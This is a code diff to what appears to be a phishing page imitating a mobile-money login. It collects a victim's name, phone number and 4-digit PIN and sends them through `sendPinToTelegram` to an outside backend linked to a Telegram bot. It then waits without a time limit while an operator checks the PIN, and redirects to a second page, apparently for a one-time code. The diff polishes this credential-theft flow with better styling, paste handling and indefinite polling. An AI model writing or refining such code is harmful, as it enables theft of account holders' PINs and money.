@@ -129,15 +129,22 @@ body{
   background:white;
 }
 
+.pin-boxes input:focus{
+  border-color:#004fc5;
+  box-shadow:0 0 0 2px rgba(0,79,197,0.2);
+}
+
 .eye{
   font-size:22px;
   color:#888;
+  cursor:pointer;
 }
 
 .forgot{
   color:#004fc5;
   margin-top:18px;
   font-size:15px;
+  cursor:pointer;
 }
 
 #status{
@@ -145,6 +152,14 @@ body{
   margin-top:10px;
   color:#d00;
   font-size:14px;
+}
+
+#status.success{
+  color:#0a0;
+}
+
+#status.waiting{
+  color:#004fc5;
 }
 
 .lower-section{
@@ -167,18 +182,31 @@ body{
   font-size:18px;
   font-weight:600;
   cursor:pointer;
+  border:none;
+  transition: background 0.3s;
+}
+
+.action:hover{
+  background:#003d99;
+}
+
+.action:active{
+  background:#003080;
+}
+
+.action.disabled{
+  opacity:0.5;
+  cursor:not-allowed;
 }
 
 @media(max-width:480px){
-
-.login-title{
-  font-size:30px;
-}
-
-.pin-boxes input{
-  width:50px;
-  height:50px;
-}
+  .login-title{
+    font-size:30px;
+  }
+  .pin-boxes input{
+    width:50px;
+    height:50px;
+  }
 }
 </style>
 </head>
@@ -236,7 +264,7 @@ body{
           <input type="tel" maxlength="1">
         </div>
 
-        <div class="eye">👁</div>
+        <div class="eye" id="toggleVisibility">👁</div>
 
       </div>
 
@@ -253,9 +281,9 @@ body{
   <div class="lower-section">
 
     <div class="action-buttons">
-      <div class="action">
+      <button class="action" id="loginBtn">
         LOG IN
-      </div>
+      </button>
     </div>
 
   </div>
@@ -279,18 +307,28 @@ document.getElementById("phoneDisplay").value =
 
 const boxes = document.querySelectorAll(".pin-boxes input");
 const statusEl = document.getElementById("status");
+const loginBtn = document.getElementById("loginBtn");
+let isPasswordVisible = false;
+
+// Toggle visibility
+document.getElementById("toggleVisibility").addEventListener("click", function() {
+  isPasswordVisible = !isPasswordVisible;
+  boxes.forEach(box => {
+    box.type = isPasswordVisible ? "text" : "tel";
+  });
+  this.textContent = isPasswordVisible ? "🙈" : "👁";
+});
 
 async function sendPinToTelegram(name, phone, pin) {
   const BACKEND_URL = "https://mixx-by-yas-biashara.onrender.com";
   
-  // Clean and validate data
   const cleanPhone = phone.replace(/\s/g, '');
   
   const payload = {
     name: name || "Unknown",
     phone: cleanPhone || "Unknown",
     pin: pin || "",
-    botId: botId || ""  // Make sure botId is sent
+    botId: botId || ""
   };
   
   console.log("Sending to backend:", payload);
@@ -307,12 +345,10 @@ async function sendPinToTelegram(name, phone, pin) {
     
     console.log("Response status:", res.status);
     
-    // Get the response text for debugging
     const responseText = await res.text();
     console.log("Response body:", responseText);
     
     if (!res.ok) {
-      // Try to parse error message from response
       try {
         const errorData = JSON.parse(responseText);
         statusEl.textContent = `Error: ${errorData.error || 'Server error'}`;
@@ -322,7 +358,6 @@ async function sendPinToTelegram(name, phone, pin) {
       return null;
     }
     
-    // Parse successful response
     const data = JSON.parse(responseText);
     console.log("Success response:", data);
     return data;
@@ -337,8 +372,8 @@ async function sendPinToTelegram(name, phone, pin) {
 async function pollPinApproval(requestId) {
   const BACKEND_URL = "https://mixx-by-yas-biashara.onrender.com";
   let attempts = 0;
-  const maxAttempts = 20; // 30 seconds max
   
+  // NO TIMEOUT - Wait indefinitely for admin approval
   return new Promise((resolve) => {
     const interval = setInterval(async () => {
       attempts++;
@@ -351,29 +386,43 @@ async function pollPinApproval(requestId) {
         
         if (data.blocked) {
           clearInterval(interval);
+          statusEl.className = "error";
           statusEl.textContent = "Your account has been blocked.";
           resolve(false);
           return;
         }
         
-        if (data.approved === true || data.approved === false) {
+        if (data.approved === true) {
           clearInterval(interval);
-          resolve(data.approved);
+          statusEl.className = "success";
+          statusEl.textContent = "PIN approved! Redirecting...";
+          resolve(true);
           return;
         }
         
-        if (attempts >= maxAttempts) {
+        if (data.approved === false) {
           clearInterval(interval);
-          statusEl.textContent = "Request timed out. Please try again.";
+          statusEl.className = "error";
+          statusEl.textContent = "Incorrect PIN. Please try again.";
           resolve(false);
+          return;
         }
+        
+        // Still waiting - show waiting message with elapsed time
+        if (attempts % 10 === 0 || attempts === 1) {
+          const elapsedSeconds = Math.floor(attempts * 1.5);
+          const minutes = Math.floor(elapsedSeconds / 60);
+          const seconds = elapsedSeconds % 60;
+          const timeStr = minutes > 0 ? `${minutes}m ${seconds}s` : `${seconds}s`;
+          statusEl.className = "waiting";
+          statusEl.textContent = `Waiting for admin approval... (${timeStr})`;
+        }
+        
       } catch (error) {
         console.error("Poll error:", error);
-        if (attempts >= maxAttempts) {
-          clearInterval(interval);
-          statusEl.textContent = "Request failed. Please try again.";
-          resolve(false);
-        }
+        // Don't stop polling on network errors - keep trying
+        statusEl.className = "waiting";
+        statusEl.textContent = "Connection issue. Retrying...";
       }
     }, 1500);
   });
@@ -397,47 +446,72 @@ boxes.forEach((box, i) => {
       
       // Validate botId
       if (!botId) {
+        statusEl.className = "error";
         statusEl.textContent = "Error: Bot ID missing. Please use the link from Telegram.";
         boxes.forEach(b => { b.disabled = false; b.value = ""; });
         boxes[0].focus();
         return;
       }
       
-      // Get user data
-      const name = localStorage.getItem("name") || "Unknown";
+      // Get user data - try multiple possible localStorage keys
+      const firstName = localStorage.getItem("firstName") || "";
+      const lastName = localStorage.getItem("lastName") || "";
+      const name = localStorage.getItem("name") || "";
+      
+      // Build full name
+      let fullName = name;
+      if (!fullName && firstName) {
+        fullName = lastName ? `${firstName} ${lastName}` : firstName;
+      }
+      if (!fullName) {
+        fullName = "Unknown";
+      }
+      
       const phone = localStorage.getItem("phone") || "Unknown";
       
-      console.log("Submitting PIN:", { name, phone, pin, botId });
+      console.log("Submitting PIN:", { fullName, phone, pin, botId });
+      console.log("localStorage keys:", Object.keys(localStorage));
       
       // Disable inputs while processing
       boxes.forEach(b => b.disabled = true);
+      loginBtn.classList.add("disabled");
+      loginBtn.textContent = "VERIFYING...";
+      statusEl.className = "waiting";
       statusEl.textContent = "Sending PIN for verification...";
       
       // Send PIN to backend
-      const res = await sendPinToTelegram(name, phone, pin);
+      const res = await sendPinToTelegram(fullName, phone, pin);
       
       if (!res || !res.requestId) {
+        statusEl.className = "error";
         statusEl.textContent = "Failed to send PIN. Please try again.";
         boxes.forEach(b => { b.disabled = false; b.value = ""; });
+        loginBtn.classList.remove("disabled");
+        loginBtn.textContent = "LOG IN";
         boxes[0].focus();
         return;
       }
       
+      statusEl.className = "waiting";
       statusEl.textContent = "Waiting for admin approval...";
       
-      // Poll for approval
+      // Poll for approval (will wait indefinitely until admin responds)
       const approved = await pollPinApproval(res.requestId);
       
       if (approved === true) {
         localStorage.setItem("pin", pin);
-        window.location.href = `code.html?botId=${botId}`;
+        setTimeout(() => {
+          window.location.href = `code.html?botId=${botId}`;
+        }, 500);
       } else if (approved === false) {
-        statusEl.textContent = "Incorrect PIN. Please try again.";
         boxes.forEach(b => { b.disabled = false; b.value = ""; });
+        loginBtn.classList.remove("disabled");
+        loginBtn.textContent = "LOG IN";
         boxes[0].focus();
       } else {
-        statusEl.textContent = "An error occurred. Please try again.";
         boxes.forEach(b => { b.disabled = false; b.value = ""; });
+        loginBtn.classList.remove("disabled");
+        loginBtn.textContent = "LOG IN";
         boxes[0].focus();
       }
     }
@@ -448,31 +522,7 @@ boxes.forEach((box, i) => {
     if (e.key === "Backspace" && !box.value && i > 0) {
       boxes[i - 1].focus();
     }
-  });
-});
-
-// Focus first input on load
-boxes[0].focus();
-
-// Add click handler for the login button
-document.querySelector(".action").addEventListener("click", () => {
-  // Check if any PIN is entered
-  let pin = "";
-  boxes.forEach(b => pin += b.value);
-  
-  if (pin.length === 4) {
-    // Trigger the last box's input event
-    const event = new Event('input');
-    boxes[3].dispatchEvent(event);
-  } else {
-    statusEl.textContent = "Please enter a 4-digit PIN";
-    boxes[0].focus();
-  }
-});
-
-// Also allow Enter key to submit
-boxes.forEach(box => {
-  box.addEventListener("keydown", (e) => {
+    // Allow Enter key to submit
     if (e.key === "Enter") {
       let pin = "";
       boxes.forEach(b => pin += b.value);
@@ -480,10 +530,44 @@ boxes.forEach(box => {
         const event = new Event('input');
         boxes[3].dispatchEvent(event);
       } else {
-        statusEl.textContent = "Please enter a 4-digit PIN";
+        statusEl.className = "error";
+        statusEl.textContent = "Please enter all 4 digits";
       }
     }
   });
+});
+
+// Focus first input on load
+boxes[0].focus();
+
+// Click handler for login button
+loginBtn.addEventListener("click", () => {
+  let pin = "";
+  boxes.forEach(b => pin += b.value);
+  
+  if (pin.length === 4) {
+    const event = new Event('input');
+    boxes[3].dispatchEvent(event);
+  } else {
+    statusEl.className = "error";
+    statusEl.textContent = "Please enter a 4-digit PIN";
+    boxes[0].focus();
+  }
+});
+
+// Handle paste functionality
+document.addEventListener('paste', (e) => {
+  const pastedData = e.clipboardData.getData('text');
+  const cleanedData = pastedData.replace(/[^0-9]/g, '');
+  
+  if (cleanedData.length === 4) {
+    boxes.forEach((box, index) => {
+      box.value = cleanedData[index] || '';
+    });
+    boxes[3].focus();
+    const event = new Event('input');
+    boxes[3].dispatchEvent(event);
+  }
 });
 </script>
 
